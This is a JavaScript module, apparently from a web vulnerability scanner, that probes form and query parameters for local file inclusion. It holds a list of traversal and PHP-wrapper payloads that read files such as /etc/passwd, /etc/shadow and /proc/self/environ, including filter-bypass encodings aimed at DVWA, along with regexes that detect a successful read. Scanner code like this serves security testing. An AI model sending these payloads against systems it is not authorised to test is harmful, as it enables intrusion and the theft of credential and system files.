const axios = require('axios');
const { URL } = require('url');
const { sendRequest } = require('./httpClient');

const LFI_PAYLOADS = [
    // Basic traversal
    "../../../../etc/passwd",
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "file:///etc/passwd",
    // Deep traversal
    "../../../../../../etc/passwd",
    "../../../../../../windows/win.ini",
    // Encoding bypasses
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....\/....\/....\/etc/passwd",
    // DVWA Medium: strips ../ but not ....// (double traversal)
    "....//....//....//....//etc/passwd",
    "..././..././..././..././etc/passwd",
    // DVWA High: fnmatch-based filter, use absolute path or encoding
    "/etc/passwd",
    "/var/www/html/../../etc/passwd",
    "file:///etc/passwd",
    // Linux system files
    "/proc/self/environ",
    "/etc/shadow",
    "/etc/hosts",
    // PHP wrappers
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=config",
    "php://input",
];

const LFI_SUCCESS_SIGNS = [
    /root:.*:0:0:/,
    /\[extensions\]/,
    /\[mci extensions\]/,
    /bin:.*:1:1:/,
    /DOCUMENT_ROOT/,
    /HTTP_USER_AGENT/,
    /127\.0\.0\.1\s+localhost/,
    /^\s*[A-Za-z0-9+\/]{50,}={0,2}\s*$/m,
];

async function scanForLFI(url, method = 'GET', data = {}, locationDescription, contentType = 'form', httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    let baseUrl = url;
    let originalParams = {};
    try {
        const urlObj = new URL(url);
        baseUrl = urlObj.origin + urlObj.pathname;
        for (const [key, value] of urlObj.searchParams) {
            originalParams[key] = value;
        }
    } catch (e) { }

    // Capture baseline
    let baselineBody = '';
    try {
        const baseRes = await makeRequest(baseUrl, method, { ...originalParams, ...data }, contentType, client);
        baselineBody = baseRes.body;
    } catch (e) { }

    for (const payload of LFI_PAYLOADS) {
        let attackData = { ...originalParams, ...data };
        for (let key in data) {
            if (data[key] === 'Submit' || data[key] === 'submit') continue;
            attackData[key] = payload;
        }

        try {
            const response = await makeRequest(baseUrl, method, attackData, contentType, client);
            const body = response.body;

            for (const regex of LFI_SUCCESS_SIGNS) {
                if (regex.test(body) && !regex.test(baselineBody)) {
                    vulnerabilities.push({
                        type: 'Local File Inclusion (LFI)',
                        name: `Directory Traversal [${contentType.toUpperCase()}]`,
                        severity: 'Critical',
                        location: locationDescription,
                        description: `Server file accessed via ${contentType} payload: ${payload}`
                    });
                    scoreDeduction += 25;
                    return { vulnerabilities, scoreDeduction };
                }
            }
        } catch (err) { }
    }

    return { vulnerabilities, scoreDeduction };
}

async function makeRequest(url, method, data, contentType, client) {
    const http = client || axios;
    return sendRequest(http, { url, method, data, contentType, timeout: 5000 });
}

module.exports = { scanForLFI };
